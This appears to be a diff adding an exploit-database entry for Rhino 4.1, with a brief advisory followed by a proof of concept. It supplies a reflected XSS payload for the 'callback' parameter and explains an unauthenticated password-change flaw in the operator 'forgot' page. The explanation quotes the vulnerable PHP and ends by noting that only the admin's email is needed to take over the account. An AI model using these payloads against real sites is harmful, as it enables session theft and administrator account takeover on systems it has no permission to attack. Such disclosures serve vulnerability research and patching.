@@ -1,0 +1,79 @@
+source: http://www.securityfocus.com/bid/65628/info
+
+Rhino is prone to a cross-site scripting vulnerability and security-bypass vulnerability .
+
+An attacker can exploit these issues to execute arbitrary script code in the context of the vulnerable site, potentially allowing the attacker to steal cookie-based authentication credentials, bypass security restrictions to obtain sensitive information, or perform unauthorized actions. Other attacks may also be possible.
+
+Rhino 4.1 is vulnerable; other versions may also be affected. 
+
+==========================
+PoC-Exploit
+==========================
+
+// Non-Persistent XSS  with "callback" Parameter in
+/include/proactive_cross.php
+
+(1) Under "callback" set your GET Parameter Callback to
+"><script>alert(document.cookie)</script>
+
+The Non-Persistent XSS will be executed for the Administrator in the
+browser (he directly logged in because you chatting with him)
+
+// Remote Change Password - with "Forgot.php"
+
+http://[target]/rhino/operator/index.php?p=forgot
+
+(1) in the forgot file there's no condition if the user logged in or not,
+so we can look deeply in the file in line (27-67)
+
+if ($_SERVER["REQUEST_METHOD"] == 'POST' && isset($_POST['newP'])) {
+    $defaults = $_POST;
+
+    $femail = filter_var($_POST['f_email'], FILTER_SANITIZE_EMAIL);
+    $pass = $_POST['f_pass'];
+    $newpass = $_POST['f_newpass'];
+
+    if ($pass != $newpass) {
+        $errors['e1'] = $tl['error']['e10'];
+    } elseif (strlen($pass) <= '5') {
+        $errors['e1'] = $tl['error']['e11'];
+    }
+
+    if ($defaults['f_email'] == '' || !filter_var($defaults['f_email'],
+FILTER_VALIDATE_EMAIL)) {
+        $errors['e'] = $tl['error']['e3'];
+    }
+
+    $fwhen = 0;
+
+    $user_check = $lsuserlogin->lsForgotpassword($femail, $fwhen);
+    if ($user_check == true && count($errors) == 0) {
+
+    // The new password encrypt with hash_hmac
+    $passcrypt = hash_hmac('sha256', $pass, DB_PASS_HASH);
+
+    $result2 = $lsdb->query('UPDATE '.DB_PREFIX.'user SET password =
+"'.$passcrypt.'", forgot = 0 WHERE email = "'.smartsql($femail).'"');
+
+    $result = $lsdb->query('SELECT username FROM '.DB_PREFIX.'user WHERE
+email = "'.smartsql($femail).'" LIMIT 1');
+    $row = $result->fetch_assoc();
+
+    if (!$result) {
+        ls_redirect(JAK_PARSE_ERROR);
+    } else {
+        $lsuserlogin->lsLogin($row['username'], $pass, 0);
+        ls_redirect(BASE_URL);
+    }
+
+    } else {
+        $errorsf = $errors;
+    }
+}
+
+So there is an MySQL Query to execute if the email in the database (Show up
+the change password settings).
+
+ALL YOU HAVE TO DO IS DISCOVER THE E-MAIL ADDRESS THAT PUTTED WHEN ADMIN
+INSTALLED THE SCRIPT.
+
